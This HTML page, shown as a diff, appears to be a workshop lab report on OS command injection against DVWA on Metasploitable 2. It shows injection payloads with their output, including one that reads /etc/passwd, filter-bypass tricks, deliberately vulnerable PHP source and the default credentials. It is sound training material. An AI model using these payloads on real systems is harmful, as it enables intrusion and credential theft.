@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="index, follow">
+
+  <title>Day 4: OS Command Execution, Burp Suite Interception & CSRF Exploitation | BugXploit Workshop | The WH2</title>
+  <meta name="description"
+    content="Day 4 hands-on web application penetration testing report from BugXploit (Koteshwor): OS Command Injection on DVWA, PHP shell execution, Burp Suite HTTP request modification, DVWA security levels (Low/Medium/High), CSRF mechanics, GET to POST conversion, anti-CSRF token analysis, and automated PoC generation via csrfshark.github.io.">
+  <meta name="keywords"
+    content="Ethical Hacking Day 4, BugXploit Workshop, OS Command Injection, Command Execution DVWA, Burp Suite proxy, HTTP request tampering, CSRF, Cross-Site Request Forgery, Change GET to POST Burp, csrfshark, anti-CSRF token bypass, DVWA security levels, PHPIDS, Birendra Sah, Bishal Shrestha, Chandan Kumar Thakur, The WH2, Penetration Testing Nepal, Koteshwor Kathmandu">
+  <meta name="author" content="Chandan Kumar Thakur (The WH2)">
+
+  <link rel="canonical"
+    href="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day4/">
+
+  <!-- Open Graph / Meta Consistency -->
+  <meta property="og:title"
+    content="Day 4: OS Command Execution, Burp Suite Interception & CSRF Exploitation | BugXploit Workshop">
+  <meta property="og:description"
+    content="Exhaustive Day 4 penetration testing lab notes: OS Command Injection on DVWA (whoami, pwd, ls), Burp Suite request modification, switching DVWA security levels, CSRF vulnerability exploitation, GET to POST conversion, and csrfshark.github.io PoC generation.">
+  <meta property="og:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+  <meta property="og:url"
+    content="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day4/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="The WH2 Knowledge Hub">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Day 4: Command Execution, Burp Suite & CSRF Deep Dive | BugXploit">
+  <meta name="twitter:description"
+    content="Detailed Day 4 penetration testing lab notes: OS Command Execution, Burp Suite HTTP manipulation, CSRF vulnerabilities, and defensive remediations. Documented by The WH2.">
+  <meta name="twitter:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+
+  <!-- JSON-LD TechArticle Schema for Search Engines and AI Crawlers -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Day 4: OS Command Execution, Burp Suite Interception & CSRF Exploitation - BugXploit Workshop",
+    "description": "Exhaustive technical lab report covering OS Command Injection vulnerability analysis on Damn Vulnerable Web Application (DVWA), shell chaining syntax, DVWA security tiers, Burp Suite proxy interception, HTTP header tampering, GET to POST request method conversion, Cross-Site Request Forgery (CSRF) password reset exploitation, anti-CSRF token evasion, and csrfshark.github.io automated PoC creation.",
+    "about": [
+      {
+        "@type": "Thing",
+        "name": "OS Command Injection (CWE-78)"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "Burp Suite Community Edition"
+      },
+      {
+        "@type": "Thing",
+        "name": "Cross-Site Request Forgery (CSRF - CWE-352)"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "Damn Vulnerable Web Application (DVWA)"
+      },
+      {
+        "@type": "Thing",
+        "name": "HTTP Request Method Switching"
+      },
+      {
+        "@type": "Thing",
+        "name": "Anti-CSRF Tokens"
+      }
+    ],
+    "author": {
+      "@type": "Person",
+      "name": "Chandan Kumar Thakur",
+      "alternateName": "The WH2",
+      "url": "https://www.chandankumarthakur.com.np/"
+    },
+    "contributor": [
+      {
+        "@type": "Person",
+        "name": "Birendra Sah",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/birendrasah4u2/"
+      },
+      {
+        "@type": "Person",
+        "name": "Bishal Shrestha",
+        "jobTitle": "Instructor",
+        "sameAs": "https://www.linkedin.com/in/bishal0x01/"
+      }
+    ],
+    "publisher": {
+      "@type": "Organization",
+      "name": "The WH2 Knowledge Hub",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.chandankumarthakur.com.np/assets/img/wh2.jpg"
+      }
+    },
+    "datePublished": "2026-09-09",
+    "dateModified": "2026-09-09",
+    "inLanguage": "en",
+    "proficiencyLevel": "Intermediate",
+    "keywords": "Command Execution, OS Command Injection, Burp Suite, DVWA, CSRF, Cross-Site Request Forgery, csrfshark, GET to POST, Anti-CSRF Token, BugXploit, Kathmandu, Nepal, Chandan Kumar Thakur, The WH2",
+    "mainEntityOfPage": "https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day4/"
+  }
+  </script>
+
+  <!-- Favicons -->
+  <link href="../../../assets/img/wh2.jpg" rel="icon">
+  <link href="../../../assets/img/wh2.jpg" rel="wh2-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i|Fira+Code:400,500,600"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../../../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../../../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../../../assets/css/style.css" rel="stylesheet">
+
+  <style>
+    .lesson-meta-bar {
+      background: #f4f8fb;
+      border-left: 4px solid #149ddd;
+      padding: 15px 20px;
+      border-radius: 0 8px 8px 0;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    .lesson-article h2 {
+      color: #173b6c;
+      font-size: 24px;
+      font-weight: 700;
+      margin-top: 35px;
+      margin-bottom: 15px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #eef3f7;
+    }
+
+    .lesson-article h3 {
+      color: #2c4964;
+      font-size: 19px;
+      font-weight: 600;
+      margin-top: 25px;
+      margin-bottom: 12px;
+    }
+
+    .lesson-article h4 {
+      color: #3f6586;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 18px;
+      margin-bottom: 8px;
+    }
+
+    .lesson-article p,
+    .lesson-article li {
+      font-size: 15.5px;
+      line-height: 1.75;
+      color: #333;
+    }
+
+    .lesson-article pre {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 18px 20px;
+      border-radius: 8px;
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      font-size: 13.5px;
+      overflow-x: auto;
+      margin: 18px 0;
+      border: 1px solid #333;
+      position: relative;
+    }
+
+    .lesson-article code {
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      background: #eef2f7;
+      color: #b02a37;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13.5px;
+    }
+
+    .lesson-article pre code {
+      background: transparent;
+      color: inherit;
+      padding: 0;
+    }
+
+    .callout-box {
+      background: #eef7fc;
+      border-left: 4px solid #149ddd;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-warning {
+      background: #fff8e6;
+      border-left: 4px solid #ffc107;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-danger {
+      background: #fdf2f2;
+      border-left: 4px solid #dc3545;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-success {
+      background: #f0fbf4;
+      border-left: 4px solid #198754;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .lesson-nav-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      margin-top: 45px;
+      padding-top: 25px;
+      border-top: 1px solid #eef3f7;
+    }
+
+    .code-block-wrapper {
+      position: relative;
+    }
+
+    .code-copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 12px;
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #e0e0e0;
+      padding: 4px 10px;
+      font-size: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      z-index: 5;
+    }
+
+    .code-copy-btn:hover {
+      background: #149ddd;
+      color: #fff;
+      border-color: #149ddd;
+    }
+
+    .code-copy-btn.copied {
+      background: #28a745;
+      color: #fff;
+      border-color: #28a745;
+    }
+
+    .terminal-window {
+      background: #0d1117;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      margin: 20px 0;
+      overflow: hidden;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .terminal-header {
+      background: #161b22;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .terminal-circle {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+    }
+
+    .tc-red {
+      background: #ff5f56;
+    }
+
+    .tc-yellow {
+      background: #ffbd2e;
+    }
+
+    .tc-green {
+      background: #27c93f;
+    }
+
+    .terminal-title {
+      color: #8b949e;
+      font-size: 12px;
+      margin-left: 6px;
+    }
+
+    .terminal-body {
+      padding: 16px;
+      color: #c9d1d9;
+      font-size: 13.5px;
+      line-height: 1.6;
+    }
+
+    .prompt-symbol {
+      color: #58a6ff;
+      font-weight: bold;
+    }
+
+    .command-output {
+      color: #8b949e;
+    }
+
+    .table-responsive {
+      margin: 20px 0;
+    }
+
+    .step-badge {
+      display: inline-block;
+      background: #149ddd;
+      color: #fff;
+      font-weight: 700;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      line-height: 28px;
+      text-align: center;
+      margin-right: 8px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body class="knowledge-page">
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Day 4: OS Command Injection & Burp Suite CSRF Lab</h2>
+          <ol>
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../index.html">Knowledge</a></li>
+            <li><a href="../index.html">Ethical Hacking</a></li>
+            <li>Day 4 Report</li>
+          </ol>
+        </div>
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Lesson Detailed Content ======= -->
+    <section class="knowledge-section">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-9 mx-auto">
+
+            <article class="lesson-article">
+
+              <!-- Article Header / Meta -->
+              <div class="border-bottom pb-3 mb-4">
+                <div class="d-flex flex-wrap gap-2 mb-2">
+                  <span class="badge bg-primary">Session 04 / 14</span>
+                  <span class="badge bg-dark">BugXploit Workshop</span>
+                </div>
+                <h1 class="fw-bold" style="color: #173b6c; font-size: 28px; line-height: 1.3;">
+                  Day 4: OS Command Execution, Burp Suite Interception &amp; CSRF Exploitation
+                </h1>
+                <div class="text-muted d-flex flex-wrap gap-3 mt-2 small align-items-center">
+                  <span><i class="bi bi-person-circle text-primary"></i> <strong>Report By:</strong> TheWH2</span>
+                  <span>
+                    <i class="bi bi-person-video3 text-primary"></i> <strong>Instructors:</strong>
+                    <a href="https://www.linkedin.com/in/birendrasah4u2/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Birendra Sah <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                    &bull;
+                    <a href="https://www.linkedin.com/in/bishal0x01/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Bishal Shrestha <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                  </span>
+                  <span><i class="bi bi-building text-primary"></i> <strong>Institute:</strong> BugXploit (Koteshwor)</span>
+                  <span><i class="bi bi-clock text-primary"></i> <strong>Read Time:</strong> ~15 mins</span>
+                </div>
+              </div>
+
+              <!-- Content Body -->
+              <div class="article-content">
+
+                <!-- Alert/Notice Box -->
+                <div class="callout-box security-notice">
+                  <h4><i class="bi bi-shield-exclamation"></i> Security Notice &amp; Lab Scope</h4>
+                  <p class="mb-0 small">
+                    This documentation captures hands-on penetration testing and web application vulnerability exploitation conducted in a strictly isolated local laboratory environment during Day 4 of the Ethical Hacking and Penetration Testing Workshop at <strong>BugXploit</strong> (Koteshwor). All tests targeted local Damn Vulnerable Web Application (DVWA) instances running on Metasploitable 2 for educational and defensive auditing purposes.
+                  </p>
+                </div>
+
+                <!-- Table of Contents -->
+                <div class="card mb-4 border-light shadow-sm" style="background: #fafcfe;">
+                  <div class="card-body">
+                    <h5 class="fw-bold mb-3" style="color: #173b6c;"><i class="bi bi-list-nested"></i> Table of Contents
+                    </h5>
+                    <div class="row">
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#lab-architecture" class="text-decoration-none">1. Lab Environment Architecture &amp; Target Setup</a></li>
+                          <li><a href="#command-execution-intro" class="text-decoration-none">2. What is OS Command Injection? (CWE-78)</a></li>
+                          <li><a href="#dvwa-command-exec" class="text-decoration-none">3. Hands-on Command Execution on DVWA</a></li>
+                          <li><a href="#dvwa-security-levels" class="text-decoration-none">4. DVWA Security Levels &amp; PHP Source Analysis</a></li>
+                          <li><a href="#burp-suite-intro" class="text-decoration-none">5. Introduction to Burp Suite Proxy</a></li>
+                        </ul>
+                      </div>
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#http-traffic-tampering" class="text-decoration-none">6. Intercepting &amp; Modifying HTTP Traffic</a></li>
+                          <li><a href="#csrf-mechanics" class="text-decoration-none">7. Understanding CSRF (Cross-Site Request Forgery)</a></li>
+                          <li><a href="#get-to-post" class="text-decoration-none">8. Method Conversion: Changing GET to POST in Burp</a></li>
+                          <li><a href="#csrf-token-bypass" class="text-decoration-none">9. Anti-CSRF Token Analysis &amp; Bypass Vectors</a></li>
+                          <li><a href="#csrfshark-poc" class="text-decoration-none">10. Weaponizing CSRF PoCs with csrfshark.github.io</a></li>
+                          <li><a href="#lab-vs-production" class="text-decoration-none">11. Why Labs Behave Differently than Production</a></li>
+                          <li><a href="#defense-remediation" class="text-decoration-none">12. Hardening &amp; Defensive Countermeasures</a></li>
+                          <li><a href="#key-takeaways" class="text-decoration-none">13. Day 4 Summary &amp; Key Takeaways</a></li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 1. Lab Environment Architecture -->
+                <h2 id="lab-architecture">1. Lab Environment Architecture &amp; Target Setup</h2>
+                <p>
+                  Building upon the reconnaissance and network discovery covered in <a href="../day1/index.html">Day 1</a> and <a href="../day2/index.html">Day 2</a>, Day 4 transitioned directly into application-layer security assessment. The target infrastructure was hosted inside our isolated VirtualBox Host-Only / Bridged subnet:
+                </p>
+                <ul>
+                  <li><strong>Attacker Workstation:</strong> Kali Linux 2026.2 (running Burp Suite Community Edition, curl, netcat, browser configured via FoxyProxy).</li>
+                  <li><strong>Target Server:</strong> Metasploitable 2 Linux Server hosting the Apache HTTP web server at <code>http://192.168.1.146/</code>.</li>
+                  <li><strong>Primary Vulnerable Application:</strong> Damn Vulnerable Web Application (DVWA) accessible at:
+                    <pre><code>http://192.168.1.146/dvwa/</code></pre>
+                  </li>
+                  <li><strong>Key Exploitation Endpoints:</strong>
+                    <ul>
+                      <li>Command Execution Lab: <code>http://192.168.1.146/dvwa/vulnerabilities/exec/</code></li>
+                      <li>CSRF (Cross-Site Request Forgery) Lab: <code>http://192.168.1.146/dvwa/vulnerabilities/csrf/</code></li>
+                      <li>DVWA Security Level Toggle: <code>http://192.168.1.146/dvwa/security.php</code></li>
+                    </ul>
+                  </li>
+                </ul>
+
+                <div class="callout-box">
+                  <strong><i class="bi bi-info-circle-fill text-primary"></i> Default DVWA Credentials:</strong>
+                  The target application requires authentication prior to navigating vulnerability modules. Standard Metasploitable 2 DVWA credentials are:
+                  <code>Username: admin</code> | <code>Password: password</code>.
+                </div>
+
+                <!-- 2. Command Execution Intro -->
+                <h2 id="command-execution-intro">2. What is OS Command Injection? (CWE-78)</h2>
+                <p>
+                  <strong>Operating System (OS) Command Injection</strong> (classified under <strong>CWE-78: Improper Neutralization of Special Elements used in an OS Command</strong>) occurs when a web application accepts user-supplied data and passes it directly to a system shell (such as <code>/bin/sh</code>, <code>/bin/bash</code>, or Windows <code>cmd.exe</code>) without adequate sanitization, escaping, or parameterization.
+                </p>
+                <p>
+                  In PHP applications, dangerous execution sinks include functions like:
+                </p>
+                <ul>
+                  <li><code>shell_exec($cmd)</code>: Executes command via shell and returns the complete output as a string.</li>
+                  <li><code>exec($cmd, $output, $return_var)</code>: Executes the command, returns the last line of output, and fills an array with all lines.</li>
+                  <li><code>system($cmd, $return_var)</code>: Executes the command, immediately outputs the result to the browser, and returns the status code.</li>
+                  <li><code>passthru($cmd)</code>: Executes command and passes raw binary output back to the HTTP response stream.</li>
+                  <li><code>popen()</code> / <code>proc_open()</code>: Opens a pipe to an executed command process for bidirectional I/O.</li>
+                  <li>Backtick operator: <code>`$cmd`</code> (equivalent to <code>shell_exec</code>).</li>
+                </ul>
+
+                <div class="callout-danger">
+                  <strong><i class="bi bi-shield-slash-fill text-danger"></i> Impact Severity (Critical):</strong>
+                  Command injection allows an unauthenticated or low-privileged remote user to execute arbitrary host commands under the privileges of the web server daemon (typically <code>www-data</code>, <code>apache</code>, or <code>nobody</code>). From there, attackers can dump databases, view sensitive config files (like <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>wp-config.php</code>), upload persistent web shells, download reverse shells, and escalate privileges to <code>root</code>.
+                </div>
+
+                <!-- 3. Hands-on Command Execution on DVWA -->
+                <h2 id="dvwa-command-exec">3. Hands-on Command Execution on DVWA</h2>
+                <p>
+                  Navigating to <code>http://192.168.1.146/dvwa/vulnerabilities/exec/</code> presents a network diagnostic interface asking the user to <em>"Enter an IP address:"</em> to perform a standard ICMP Ping check.
+                </p>
+
+                <h3>Shell Operator Mechanics</h3>
+                <p>
+                  On Unix-like operating systems, the shell interprets special metacharacters that allow chaining multiple commands together in a single line:
+                </p>
+
+                <div class="table-responsive">
+                  <table class="table table-bordered table-striped align-middle">
+                    <thead class="table-dark">
+                      <tr>
+                        <th>Operator</th>
+                        <th>Name</th>
+                        <th>Execution Logic</th>
+                        <th>Example Injection</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><code>;</code></td>
+                        <td>Semicolon</td>
+                        <td>Sequential execution regardless of success or failure of previous command.</td>
+                        <td><code>127.0.0.1; whoami</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>&amp;&amp;</code></td>
+                        <td>Logical AND</td>
+                        <td>Executes second command only if the first command returns exit code 0 (success).</td>
+                        <td><code>192.168.1.1 &amp;&amp; ls -la</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>||</code></td>
+                        <td>Logical OR</td>
+                        <td>Executes second command only if the first command returns a non-zero exit code (failure).</td>
+                        <td><code>invalid_ip || id</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>|</code></td>
+                        <td>Pipe</td>
+                        <td>Pipes the standard output (stdout) of the first command as stdin to the second command.</td>
+                        <td><code>127.0.0.1 | uname -a</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>&amp;</code></td>
+                        <td>Background Operator</td>
+                        <td>Runs first command in the background and immediately starts the second command concurrently.</td>
+                        <td><code>127.0.0.1 &amp; cat /etc/passwd</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>`cmd`</code> or <code>$(cmd)</code></td>
+                        <td>Command Substitution</td>
+                        <td>Evaluates inner command and replaces its token with stdout before running parent command.</td>
+                        <td><code>127.0.0.1 $(whoami)</code></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <h3>Executing Real Payloads in Lab</h3>
+
+                <p><strong>Test 1: Legitimate Ping Request</strong></p>
+                <p>Submitting a standard loopback address <code>127.0.0.1</code> executes <code>ping -c 3 127.0.0.1</code> in the background and prints three ICMP echo replies.</p>
+
+                <p><strong>Test 2: Chaining with Logical AND (<code>&amp;&amp;</code>)</strong></p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">DVWA Command Injection Input</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">Payload:</span> 192.168.1.1 &amp;&amp; ls<br>
+                    <span class="command-output">PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.<br>
+                    64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.821 ms<br>
+                    64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.912 ms<br>
+                    64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.875 ms<br>
+                    --- 192.168.1.1 ping statistics ---<br>
+                    3 packets transmitted, 3 received, 0% packet loss, time 2002ms<br>
+                    rtt min/avg/max/mdev = 0.821/0.869/0.912/0.046 ms<br>
+                    index.php<br>
+                    source</span>
+                  </div>
+                </div>
+
+                <p><strong>Test 3: Extracting Working Directory (<code>pwd</code>) &amp; Web User Identity (<code>whoami</code>)</strong></p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Information Disclosure Payloads</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">Payload:</span> 127.0.0.1; pwd; whoami; id<br>
+                    <span class="command-output">/var/www/dvwa/vulnerabilities/exec<br>
+                    www-data<br>
+                    uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                  </div>
+                </div>
+
+                <p><strong>Test 4: Reading Sensitive System Files (<code>/etc/passwd</code>)</strong></p>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Sensitive File Extraction</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">Payload:</span> 127.0.0.1; cat /etc/passwd | head -n 8<br>
+                    <span class="command-output">root:x:0:0:root:/root:/bin/bash<br>
+                    daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>
+                    bin:x:2:2:bin:/bin:/bin/sh<br>
+                    sys:x:3:3:sys:/dev:/bin/sh<br>
+                    sync:x:4:65534:sync:/bin:/bin/sync<br>
+                    games:x:5:60:games:/usr/games:/bin/sh<br>
+                    man:x:6:12:man:/var/cache/man:/bin/sh<br>
+                    lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span>
+                  </div>
+                </div>
+
+                <!-- 4. DVWA Security Levels & Source Analysis -->
+                <h2 id="dvwa-security-levels">4. DVWA Security Levels &amp; PHP Source Analysis</h2>
+                <p>
+                  DVWA provides four distinct security postures controlled at <code>http://192.168.1.146/dvwa/security.php</code>:
+                  <strong>Low</strong>, <strong>Medium</strong>, <strong>High</strong>, and <strong>Impossible</strong>. Understanding why each level fails or succeeds illustrates defense-in-depth engineering.
+                </p>
+
+                <h3>Level: Low (Zero Input Sanitization)</h3>
+                <p>Examining the backend PHP source code for the Low security level reveals direct string concatenation:</p>
+                <pre><code>&lt;?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input from user form
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows command
+        $cmd = shell_exec( 'ping  ' . $target );
+    } else {
+        // *nix command - DIRECT STRING CONCATENATION WITHOUT SANITIZATION!
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Output to browser
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+?&gt;</code></pre>
+                <div class="callout-box">
+                  <strong>Flaw:</strong> The developer relied on the user inputting a valid IP address. Because <code>$target</code> is concatenated directly into <code>'ping -c 4 ' . $target</code>, passing <code>127.0.0.1; ls</code> transforms the command executed by bash into: <code>ping -c 4 127.0.0.1; ls</code>.
+                </div>
+
+                <h3>Level: Medium (Blacklist Filtering Flaw)</h3>
+                <p>In Medium security, the developer attempts to filter metacharacters using an incomplete blacklist:</p>
+                <pre><code>&lt;?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Set blacklist array
+    $substitutions = array(
+        '&amp;&amp;' =&gt; '',
+        ';'  =&gt; '',
+    );
+
+    // Remove any matches from the input string
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Execution sink
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        $cmd = shell_exec( 'ping  ' . $target );
+    } else {
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+?&gt;</code></pre>
+                <div class="callout-warning">
+                  <strong>Bypass Methodology:</strong>
+                  Notice that the developer only removed <code>&amp;&amp;</code> and <code>;</code>.
+                  <br>1. <strong>Single Ampersand:</strong> <code>127.0.0.1 &amp; whoami</code> runs ping in the background and immediately runs whoami.
+                  <br>2. <strong>Pipe Operator:</strong> <code>127.0.0.1 | whoami</code> works because <code>|</code> is not blacklisted.
+                  <br>3. <strong>Nested Replacement:</strong> <code>&amp;&amp;&amp;&amp;</code> or <code>;&amp;&amp;;</code> might bypass non-recursive <code>str_replace()</code> filters.
+                </div>
+
+                <h3>Level: High (Regex Character Stripping Bypass)</h3>
+                <p>In High security, the blacklist expands significantly, but subtle developer typos leave attack surface open:</p>
+                <pre><code>&lt;?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    $target = trim($_REQUEST[ 'ip' ]);
+
+    // High Security Blacklist
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';'  =&gt; '',
+        '| ' =&gt; '',  // NOTICE THE ACCIDENTAL SPACE AFTER THE PIPE!
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+    $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+?&gt;</code></pre>
+                <div class="callout-danger">
+                  <strong>High Bypass Trick:</strong> Notice line 8: <code>'| ' =&gt; ''</code>. The developer accidentally included a trailing space after the pipe character! Therefore, if an attacker provides a pipe <em>without</em> an immediate trailing space (e.g., <code>127.0.0.1|whoami</code> or <code>127.0.0.1|cat /etc/passwd</code>), the replacement condition is false, and the shell executes the command perfectly!
+                </div>
+
+                <h3>Level: Impossible (True Parameterization / Strict Whitelisting)</h3>
+                <p>The secure implementation validates that the input strictly matches 4 octets separated by dots:</p>
+                <pre><code>&lt;?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+    $target = $_REQUEST[ 'ip' ];
+    $target = stripslashes( $target );
+
+    // Split the IP into 4 octets
+    $octet = explode( ".", $target );
+
+    // Verify all 4 elements exist and are strictly integers
+    if( ( sizeof( $octet ) == 4 ) &amp;&amp;
+        is_numeric( $octet[0] ) &amp;&amp;
+        is_numeric( $octet[1] ) &amp;&amp;
+        is_numeric( $octet[2] ) &amp;&amp;
+        is_numeric( $octet[3] ) ) {
+        // Re-synthesize strictly sanitized IP string
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+        $cmd = shell_exec( 'ping  -c 4 ' . escapeshellarg( $target ) );
+        echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+    } else {
+        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';
+    }
+}
+?&gt;</code></pre>
+
+                <!-- 5. Introduction to Burp Suite Proxy -->
+                <h2 id="burp-suite-intro">5. Introduction to Burp Suite Proxy</h2>
+                <p>
+                  <strong>Burp Suite</strong> (developed by PortSwigger) is the industry-standard integrated platform for performing security testing of web applications. During Day 4, instructor <strong>Birendra Sah</strong> introduced the core architecture of Burp Suite:
+                </p>
+                <ul>
+                  <li><strong>Intercepting Proxy:</strong> Positioned as a Man-in-the-Middle (MitM) between your browser and the web application. Every HTTP/HTTPS request and response can be captured, inspected, and modified on the fly before reaching the server.</li>
+                  <li><strong>Repeater:</strong> A tool for crafting, modifying, and re-issuing individual HTTP requests, viewing responses side-by-side without reloading browser pages.</li>
+                  <li><strong>Intruder:</strong> Automated custom payload delivery engine for brute-forcing, credential stuffing, and fuzzing input parameters.</li>
+                  <li><strong>Target &amp; Site Map:</strong> Passive cataloging of every host, URL, directory path, parameter, and response code encountered during a browsing session.</li>
+                </ul>
+
+                <h3>Configuring the Browser Proxy</h3>
+                <p>To route browser traffic through Burp Suite:</p>
+                <ol>
+                  <li>Launch Burp Suite on Kali Linux: <code>burpsuite &amp;</code></li>
